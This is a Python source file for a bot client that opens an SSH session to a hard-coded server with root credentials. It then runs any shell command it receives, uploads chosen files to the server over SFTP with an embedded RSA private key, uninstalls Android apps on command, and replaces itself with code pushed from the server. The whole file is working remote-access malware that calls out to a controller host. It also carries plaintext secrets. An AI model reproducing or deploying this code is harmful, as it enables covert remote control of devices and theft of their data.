from paramiko import Transport
from paramiko import SFTPClient
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from threading import  Thread
from  subprocess import Popen
from  subprocess import PIPE
from paramiko import RSAKey
import ChannelSSH
import os.path
import logging
logging.basicConfig()
duper_lp= "./path.cnf"
ip_server='192.168.1.14'
private_key='''
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0vCK2TEiDu4xTWaQE26ZF2bQeJqIB7lAw6bN7CwzInJBFO0v
gYdEPaa9WwjkV2xvo/yjqiEW1ZO5awBQOvD26uuJ77i4BFNPH9x6G8LC3cfDZchz
eic+krDQ35QrliokEG3r53qVteZ3U0ycI2kFi4L1Qi6v+C6uL7vI/KKFpxl5pLr+
rJYuSX0qzPRpA86eDECcoWUNRNSP2z5rHJ+G/vtMlZbodTyhXf0p45SAMID6LCHB
paHSZzqs1H/6j/8QOWLRFog52eTqvkcOhFQ9+oOfsaoWjWO6/5/Yt0Cp9inK7MN4
Ha85bSacyh+Y0BsBXEpK1L658pqBzvqVAK+aZwIDAQABAoIBAQDQvcVJhTuk9sXH
SJWPBUVuSQpILvQqYILcmrbw3hSEI/iPkuAOGCPJtrVv3u7ILMCV0S7M7w2/sP4u
CxNaIJbYhtnrZiqD7UVBzFbyHdvkyQhuMt1Dpo5fb6Zjeidf5Lfnoj9uxHpelYDD
5+4jhIw+MQwvwC/XM6qgBf6xMst8PQYdQii1q507s1Ck4kGm6OznF42o+GVHVdwe
w58zMBbOefGn/J2Wy9MhEphVrH3d8xf/CK28DwtSjkJYBhE2hYAlQ140ZwBeEcYU
IpHdNbne3NhREaPtDFiFd4vKZrHK3Y7qXGKokVbvwidnaOYg3YBIAs/JNAdFhlkf
lWhaSDWxAoGBAPvrFgf/Q9FYj3o+sWRHFTUy2f/7BpMdUB/ZRusSQ9HenWvCeu3L
UhhjUJVwGHF3oU0yEERc7BhcgrG7MqI37xlEoLHi2pS3Ydds7p4FPjVCsj/XTKF8
f4reDtVCvYzjKHS27Ds1zNhFRQzbKgQ+JGk4VCyEz2Yhzvxhg4TVqGc1AoGBANZb
e9cng5Eent45uuugqhQx29Ag/RZ0LYcEpOP/2GlZ7nvuZGP/HhpvR3/CFqL9bVhy
wFJHZ3gtp3g2VEOKDGrWtpDy7/cLqAupCWfyh/89/BZ28KAi8gNkkXFXTtOVqhHy
D11ph8RAyNDYUvnX/4rU/qdAvQdXgssG822MG0KrAoGAT4XWXo/mCJ+8Kwq/VLhb
qX9z8ap8WNRYBrW//VS2s/liGDI8O/SC5c/0EDhifu8UrBmxqOLsZIRPfWtqgGrH
v2I6l+zUsz1wVWC9soRVLtrvCdgdCJ0UZfHTHN8ElwTeMHnN+KLzFxJGydglW1GC
jPSLHcKO9d6WSHU/3x7TGkECgYEArKHIvqIIB1uNvpLnwtQFpXXx/VBUAz1VXSOU
WDq340CWHCEFoLLZX5i3EGETMfi/kzf3Q0xWPCcodFvsyOfo0DJTnbDJKUCt+ZYN
CTX96MXWu5DWgWEjXzAjIhCaXzRtXz5+uVBAEwHJuMg/Kw+Vsg2PeMtecQc9Qp06
dsMbQTkCgYBvI8Cj8jYUf0TJTMULv3LOTW4mzFPdI5W2GRdMz7OW1p3ENjalWKYj
kTuN4zDdwOmPseicCnE839aJrihZsJ4EVw4rZwa+LZZnIjSU+gUtDSrv0FI+t4aV
L5ltJkdeI5PbXeaCXum1UJIL5lPNB05nwGHxgJc6gnpSzxQYDt1l8Q==
-----END RSA PRIVATE KEY-----

'''
class Bot():
    def __init__(self):
        self.path_source = None
        self.path_destination = None
        self.chan = None
        self.tags = None
        key = open('priv_key', 'w+')
        key.write(private_key)
        key.close()

    def delete_apk(self,com_object):
        try:
            result = self.getOutputCmd("pm uninstall {}".format(com_object))
            return 0
        except:
            return 1

    def parse_apk_list(self):
        output = self.getOutputCmd("pm list packages -f -3").split('\n')
        return output

    def search_app(self,app_list, app_name):
        found = 0
        result = []

        for element in app_list:
            apk = element[8:].split('=')[0]
            com_object = element[8:].split('=')[1]

            if (app_name in apk) or (app_name in com_object):
                found = 1
                if self.delete_apk(com_object) == 0:
                    result.append(apk)

        if not found:
            ChannelSSH.sendToChannel("[-]App {} not found".format(app_name), self.chan)

        return result

    def rreplace(s, old, new, occurrence):
        li = s.rsplit(old, occurrence)
        return new.join(li)

    def update(self):
        file = ChannelSSH.receiveFromChannel(self.chan)
        self.getOutputCmd('rm bot.py')
        self.chan.close()
        open('bot.py', 'w+').write(file)
        self.getOutputCmd('chmod 777 bot.py')
        self.getOutputCmd('sleep 3 && python bot.py')

    def getOutputCmd(self,cmd):
        # do shell command
        try:
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            return stdout_value
        except:
            pass

    def sftp_authentication(self):
        try:
            transport = Transport((ip_server, 222))
            privatekeyfile = os.path.expanduser('./priv_key')
            mykey = RSAKey.from_private_key_file(privatekeyfile)
            transport.connect(username='bot', pkey=mykey)
            sftp_client = SFTPClient.from_transport(transport)
            return  sftp_client, transport
        except Exception, e:
            print "SFTP Authentication Fail:"+str(e)

    def dump_db(self):
        try:
            msgerror=""
            sftp_client, transport = self.sftp_authentication()
            with open(duper_lp) as f:
                content = f.readlines()
            # to remove whitespace characters like `\n` at the end of each line
            for line in content:
                line=line.strip()
                if os.path.isfile(line):
                    sftp_client.put(line,self.path_destination+self.tags+'_'+os.path.basename(line))
                else:
                    msgerror+="-- le fichier "+str(line)+" n'existe pas !! \n"
            sftp_client.close()
            transport.close()
            ChannelSSH.sendToChannel(msgerror+"\n[*] End of dumping files \n", self.chan)
        except Exception, e:
            print "Fct:Dumper file export: " + str(e)
    def get_dumper_file(self):
        try:
            sftp_client, transport = self.sftp_authentication()
            # should verify if file duper_lp exist, create it else
            if not os.path.isfile(duper_lp):
                open(duper_lp, "w+").close()
            sftp_client.get(self.path_source, duper_lp, callback=None)
            sftp_client.close()
            transport.close()
            return "OK"
        except Exception, e:
            print "Fct:Dumper file import: "+str(e)
            return  str(e)


    def connect(self):
        subRoot = None
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect(ip_server,port=2222, username='root', password='thetoorpassword')
        self.chan = client.get_transport().open_session()
        while True:
            command = ChannelSSH.receiveFromChannel(self.chan)
            if 'deconnect' == command:
                ChannelSSH.closeChannel(self.chan)
                break
            elif 'dump' == command:
                Thread(target=self.dump_db).start()
            elif '**LOADPATH**' in command:
                inita, path_d,tags,path_s = command.split(';')
                self.path_source = path_s
                self.path_destination = path_d
                self.tags = tags
                self.get_dumper_file()
            elif 'update_dumper' == command:
                result=self.get_dumper_file()
                ChannelSSH.sendToChannel(result, self.chan)
            elif 'delete' in command:
                try:
                    cmd, deleteapp = command.split(' ')
                    output = self.parse_apk_list()
                    result = self.search_app(output, deleteapp)
                    if len(result) >= 1:
                        ChannelSSH.sendToChannel("[+] App successfully deleted", self.chan)
                except:
                    ChannelSSH.sendToChannel('[-] Command syntax error', self.chan)
            elif 'update' in command:
                if not 'bot.py' in self.getOutputCmd('ls'):
                    ChannelSSH.sendToChannel('Your are not in the directory containing the code', self.chan)
                else:
                    ChannelSSH.sendToChannel('OK!', self.chan)
                    self.update()
                    break
            elif 'cd' in command:
                try:
                    code, directory = command.split(' ')
                    os.chdir(directory)
                    ChannelSSH.sendToChannel("[+] CWD Is " + os.getcwd(), self.chan)
                except:
                    ChannelSSH.sendToChannel("[-] Error, Double check the Dir", self.chan)
            else:
                ChannelSSH.sendToChannel(self.getOutputCmd(command),self.chan)


if __name__ == '__main__':
    bot = Bot()
    bot.connect()
    #teest update